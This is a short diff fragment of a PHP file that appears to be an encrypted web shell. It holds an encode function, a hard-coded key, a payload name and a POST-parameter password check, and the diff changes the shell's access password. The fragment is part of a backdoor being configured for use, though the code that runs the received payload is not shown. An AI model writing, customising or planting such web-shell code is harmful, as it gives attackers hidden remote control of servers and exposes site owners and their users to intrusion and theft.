@@ -9,7 +9,7 @@ function encode($D,$K){
     }
     return $D;
 }
-$pass='Momika@233';
+$pass='Abcd@12331';
 $payloadName='payload';
 $key='3a2a9aef4cbed812';
 if (isset($_POST[$pass])){
